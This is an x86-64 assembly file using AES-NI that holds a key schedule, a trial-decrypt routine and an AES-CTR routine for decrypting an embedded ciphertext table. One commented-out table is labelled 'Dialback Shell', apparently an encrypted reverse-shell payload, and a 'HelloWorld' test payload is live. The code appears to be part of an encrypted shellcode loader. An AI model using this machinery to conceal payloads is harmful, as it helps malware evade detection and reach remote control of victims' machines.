
.align 16
key_schedule:
    .quad 0xf0e0d0c0b0a0908, 0x706050403020100      // xmm0
    .quad 0xfe76abd6f178a6da, 0xfa72afd2fd74aad6    // xmm1
    .quad 0xfeb3306800c59bbe, 0xf1bd3d640bcf92b6    // xmm2
    .quad 0x41bf6904bf0c596c, 0xbfc9c2d24e74ffb6    // xmm3
    .quad 0xfd8d05fdbc326cf9, 0x33e3595bcf7f747     // xmm4
    .quad 0xaa22f6ad57aff350, 0xeb9d9fa9e8a3aa3c    // xmm5
    .quad 0x6b1fa30ac13d55a7, 0x9692a6f77d0f395e    // xmm6
    .quad 0x26c0a94e4ddf0a44, 0x8ce25fe31a70f914    // xmm7
    .quad 0xd27abfaef4ba16e0, 0xb9651ca435874347    // xmm8
    .quad 0x4e972cbe9ced9310, 0x685785f0d1329954    // xmm9
    .quad 0xc5302b4d8ba707f3, 0x174a94e37f1d1113    // xmm10

		//0x417f6d49ffe25fff9563b397028fd3c1
	.quad 0xc1d38f0297b36395, 0xff5fe2ff496d7f41

ctext:   // Dialback Shell                 
    /*
    .quad 0x4cc5fabc529c7f72, 0xb246bf9a072691c4
    .quad 0x1614ea67fb81667a, 0x1cbbdca18b115764
    .quad 0x9fa8b87d5a7886ff, 0xb8b899864bb7d446
    .quad 0x54e4869e512a654e, 0x3ada5836213794a7
    .quad 0xbdca70c9ce650c87, 0xafc31c08d0aa542e
    .quad 0x03ea00addf2c4274, 0x5f836a7e8685bb85
    .quad 0x53145abbe835eadf, 0xe8b4b0674ecd40d6
    .quad 0x2a0e44fbe436e8a3, 0xd9251bdb293202a4
    .quad 0x91518bcd3d48e6ea, 0xa8c07ae45dda1db8
    .quad 0x152629d2e639f143, 0x43162e2a47515f54
    .quad 0x36c1899a216be1c5, 0x317381b329be545c
    .quad 0xce935e8be989335c, 0x873397e8dca105b0
    .quad 0x1ec6b6ca43c42873, 0x08be792abfeab953
    .quad 0xfdc072915a1df487, 0x16379cb013ac82c9
    .quad 0x780a36e448f3f2b6, 0xa8c374fcd2b4242f
    .quad 0xbdb27c4982ea67b9, 0xdc95d365933b70b6
    .quad 0x87bcf7a74954f329, 0x05e94ca63ff251cb
    .quad 0xce569557c65583ec, 0x20e3632c94b3915c
    .quad 0x5bb32168e2e546dc, 0xb219ff7e6f065b2e
    .quad 0x3522538c88358bc7, 0x09bda351424b6348
    .quad 0xd79979e37810daba, 0x3099a31772ebecb9
    .quad 0x5e84184c9b029bda, 0x981679679a0ac158
    .quad 0x9eb6a5d82e722bc8, 0xe20840570ae87af3
    .quad 0x593c47a7ececca83, 0x2f43eecde3d637ca
    */

    // HelloWorld (test SPASM) 
    .quad 0x4cc5fabc529c7f72, 0xb246bf9a072691c4
    .quad 0x1614ea67fb81667a, 0x1cbbdca18b115764
    .quad 0xa5ae837b717595d2, 0x92a499864bb7d446
    .quad 0x62e181816a2b6a4d, 0x0cdf50363631a2a5
    .quad 0x8bcc5bdbe64c2198, 0x84c61817ebab562d
    .quad 0x06e400a9c0174377, 0x5cb56f5e8b82b386
    .quad 0x7f225f93fa1dcff2, 0xf79bb45c4fc843e1
    .quad 0x1b1c67dfcd29c08f, 0xeb3737f2072d2988
    .quad 0x8e7abbcf1565cbc6, 0x9ad253ce73c53c94
    .quad 0x080723d8e63ef147, 0x43132e2f47545f51
    .quad 0x2df494af3c5efcf0, 0x2c439c83348e496c
    .quad 0xd0915c91f3962b6c, 0x9a0295e7c0961bb2
    .quad 0x06f6b4c55ffc3671, 0x108f6418bde5a567
    .quad 0xcfc27d8d6e03f698, 0x0e079ebf0f9b9ccb
    .quad 0x643e28e657ebc3b4, 0xa7df4ce2d0ac1532
    .quad 0xbfad647b80e57b81, 0xc297cb548e0972b9




.text
.global try_decrypt
try_decrypt:
	pushq %rbp
	movq %rsp, %rbp

    mov $key_schedule, %rcx
    movaps 0x00(%rcx), %xmm0
    movaps 0x10(%rcx), %xmm1
    movaps 0x20(%rcx), %xmm2
    movaps 0x30(%rcx), %xmm3
    movaps 0x40(%rcx), %xmm4
    movaps 0x50(%rcx), %xmm5
    movaps 0x60(%rcx), %xmm6
    movaps 0x70(%rcx), %xmm7
    movaps 0x80(%rcx), %xmm8
    movaps 0x90(%rcx), %xmm9
    movaps 0xa0(%rcx), %xmm10

	movaps 0xb0(%rcx), %xmm15

    aesimc %xmm1, %xmm1
    aesimc %xmm2, %xmm2
    aesimc %xmm3, %xmm3
    aesimc %xmm4, %xmm4
    aesimc %xmm5, %xmm5
    aesimc %xmm6, %xmm6
    aesimc %xmm7, %xmm7
    aesimc %xmm8, %xmm8
    aesimc %xmm9, %xmm9

    pxor %xmm10, %xmm15

    aesdec %xmm9, %xmm15
    aesdec %xmm8, %xmm15
    aesdec %xmm7, %xmm15
    aesdec %xmm6, %xmm15
    aesdec %xmm5, %xmm15
    aesdec %xmm4, %xmm15
    aesdec %xmm3, %xmm15
    aesdec %xmm2, %xmm15
    aesdec %xmm1, %xmm15
    aesdeclast %xmm0, %xmm15

	movq %xmm15, %rax
	//bswap %rax

	leave
	ret

.text
.global aes_ctr
aes_ctr:
	mov $key_schedule, %rcx
    movaps 0x00(%rcx), %xmm0
    movaps 0x10(%rcx), %xmm1
    movaps 0x20(%rcx), %xmm2
    movaps 0x30(%rcx), %xmm3
    movaps 0x40(%rcx), %xmm4
    movaps 0x50(%rcx), %xmm5
    movaps 0x60(%rcx), %xmm6
    movaps 0x70(%rcx), %xmm7
    movaps 0x80(%rcx), %xmm8
    movaps 0x90(%rcx), %xmm9
    movaps 0xa0(%rcx), %xmm10

	movq %rdi, %rax
	bswap %rax
	movq %rax, %xmm15		// initialize counter

	pxor %xmm0, %xmm15
    aesenc %xmm1, %xmm15
    aesenc %xmm2, %xmm15
    aesenc %xmm3, %xmm15
    aesenc %xmm4, %xmm15
    aesenc %xmm5, %xmm15
    aesenc %xmm6, %xmm15
    aesenc %xmm7, %xmm15
    aesenc %xmm8, %xmm15
    aesenc %xmm9, %xmm15
    aesenclast %xmm10, %xmm15

	// Xor with ctext
	mov $ctext, %rcx
	imul $0x10, %rdi
	addq %rcx, %rdi
	movaps 0x00(%rdi), %xmm14
	pxor %xmm14, %xmm15

	// return __uint128_t in rax,rdx
	movq %xmm15, %rdx
	psrldq $0x8, %xmm15
	movq %xmm15, %rax
	ret
